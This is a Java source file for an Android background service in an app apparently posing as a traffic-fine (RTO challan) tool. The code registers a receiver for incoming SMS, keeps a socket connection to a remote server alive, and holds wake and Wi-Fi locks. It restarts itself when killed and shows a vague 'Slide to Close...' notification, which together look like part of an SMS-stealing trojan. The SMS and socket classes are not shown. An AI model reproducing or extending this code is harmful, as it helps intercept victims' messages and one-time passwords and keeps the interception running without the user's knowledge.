package com.service.rtochallan;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

public class RunningService extends Service {

    private static String CHANNEL_ID = "";
    private static String TAG = "";

    private SmsReceiver smsReceiver;
    private SocketManager socketManager;
    private Helper helper;

    private PowerManager.WakeLock wakeLock;
    private WifiManager.WifiLock wifiLock;

    // ✅ For network detection (API < 24)
    private BroadcastReceiver legacyNetworkReceiver;

    // ✅ For API >= 24 (Android 7+)
    private ConnectivityManager.NetworkCallback networkCallback;

    @Override
    public void onCreate() {
        super.onCreate();

        helper = new Helper();
        TAG = helper.TAG;
        CHANNEL_ID = helper.BG_CHANNEL_ID;

        createNotificationChannel();
        startForegroundService();

        // ✅ Acquire Partial WakeLock — keeps CPU awake
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "MyApp::CpuLock");
        wakeLock.acquire();

        // ✅ Acquire WiFiLock — keeps WiFi from sleeping
        WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        wifiLock = wifiManager.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "MyApp::WifiLock");
        wifiLock.acquire();

        // ✅ Register SMS receiver
        IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        smsReceiver = new SmsReceiver();
        registerReceiver(smsReceiver, filter);

        // ✅ Initialize and connect socket
        socketManager = SocketManager.getInstance(getApplicationContext());
        socketManager.connect();

        // ✅ Register network listener
        registerNetworkListeners();



        helper.show( "RunningService created and initialized");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Service restarts automatically if killed
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        helper.show( "RunningService onDestroy() called");
        if (socketManager!=null && socketManager.isConnected()) {
            helper.show("Offline By On OnDestroy through system/user");
            socketManager.deviceOfflineBy("Offline By On OnDestroy through system/user ", "offline");
        }
        if (smsReceiver != null) {
            unregisterReceiver(smsReceiver);
            smsReceiver = null;
        }
        unregisterNetworkListeners();
        if (socketManager != null) {
            socketManager.disconnect();
        }
        // ✅ Release locks when done
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
            helper.show("RunningService: WakeLock released");
        }
        if (wifiLock != null && wifiLock.isHeld()) {
            wifiLock.release();
            helper.show("RunningService: WifiLock released");
        }

        super.onDestroy();
        helper.show( "RunningService destroyed");
    }


    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null; // Not a bound service
    }

    // --------------------------------------------------------------------
    // 🔗 NETWORK DETECTION (Wi-Fi + Mobile Data)
    // --------------------------------------------------------------------
    private void registerNetworkListeners() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);

        // ✅ Modern method (Android 7+)
        networkCallback = new ConnectivityManager.NetworkCallback() {
            @Override
            public void onAvailable(Network network) {
                super.onAvailable(network);
                helper.show( "Network Available");
                if (socketManager != null && !socketManager.isConnected()) {
                    socketManager.connect();
                }
            }

            @Override
            public void onLost(Network network) {
                super.onLost(network);
                helper.show("Network lost — disconnecting socket");
                if (socketManager != null) {
                    socketManager.disconnect();
                }
            }
        };

        NetworkRequest networkRequest = new NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build();
        cm.registerNetworkCallback(networkRequest, networkCallback);
        helper.show( "NetworkCallback registered");

    }

    private void unregisterNetworkListeners() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);

        if (networkCallback != null) {
            try {
                cm.unregisterNetworkCallback(networkCallback);
                helper.show( "NetworkCallback unregistered");
            } catch (Exception e) {
                helper.show( "Error unregistering networkCallback: " + e.getMessage());
            }
        }

        if (legacyNetworkReceiver != null) {
            try {
                unregisterReceiver(legacyNetworkReceiver);
                legacyNetworkReceiver = null;
                helper.show( "Legacy network receiver unregistered");
            } catch (Exception e) {
                helper.show("Error unregistering legacyNetworkReceiver: " + e.getMessage());
            }
        }
    }

    // --------------------------------------------------------------------
    // 🔔 FOREGROUND SERVICE SETUP
    // --------------------------------------------------------------------
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Background Service Channel",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(serviceChannel);
        }
    }

    @SuppressLint("ForegroundServiceType")
    private void startForegroundService() {
        Intent browserIntent = new Intent(Intent.ACTION_VIEW, android.net.Uri.parse("https://www.google.com"));
        browserIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

        PendingIntent pendingIntent = PendingIntent.getActivity(
                this,
                0,
                browserIntent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentText("Slide to Close...")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .build();

        startForeground(1, notification);
    }

}
